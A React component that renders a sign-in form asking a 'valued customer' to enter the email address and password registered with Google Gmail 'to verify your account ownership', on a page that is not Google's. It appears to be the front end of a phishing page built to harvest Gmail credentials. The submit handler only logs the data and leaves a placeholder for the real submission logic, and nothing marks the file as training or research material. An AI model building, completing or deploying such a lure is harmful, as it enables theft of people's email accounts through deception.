import { useState } from "react";
import logo from "../assets/logo.jpg";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import FormErrMsg from "./FormErrMsg";

// Define the schema for form validation
const schema = yup.object().shape({
  email: yup.string().email("Invalid email address").required("Email is required"),
  password: yup.string().required("Password is required"),
});

const Mail = () => {
  const [loading, setLoading] = useState(false);
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });

  // Handle form submission
  const submitForm = (data: unknown) => {
    console.log(data);
    // Add your form submission logic here
  };

  return (
    <div className="flex flex-col items-center justify-center min-h-screen">
      <div className="w-full max-w-md p-6 bg-white">
        <div className="flex flex-col items-center mb-6 gap-3">
          <img src={logo} alt="logo" className="w-32 h-32 object-cover mb-4" />
          <h1 className="text-2xl font-bold">Welcome valued customer</h1>
          <p className="text-gray-500">Kindly use the correct email adress and email password registered with Google gmail to verify your account ownership</p>
        </div>
        <form onSubmit={handleSubmit(submitForm)} className="space-y-4">
          <div className="mb-10">
            <label htmlFor="email" className="text-sm font-medium text-gray-700 flex">Email Address</label>
            <input
              type="email"
              id="email"
              placeholder="example@email.com"
              {...register("email")}
              className="mt-1 block w-full px-3 py-3 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm"
            />
            <FormErrMsg errors={errors} inputName="email" />
          </div>
          <div className="mt-10">
            <label htmlFor="password" className="text-sm font-medium text-gray-700 flex">Password</label>
            <input
              type="password"
              id="password"
              placeholder="***********"
              {...register("password")}
              className="mt-1 block w-full px-3 py-3 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm"
            />
            <FormErrMsg errors={errors} inputName="password" />
          </div>
          <div className="pt-5">
          <button
            type="submit"
            disabled={loading}
            className="w-full py-4 px-4 bg-[#68a502] text-white font-semibold rounded-md shadow-sm"
          >
            {loading ? <p className="font-thin">Loading...</p> : <p className="font-thin">Sign In</p>}
          </button>
          </div>
        </form>
      </div>
    </div>
  );
};

export default Mail;
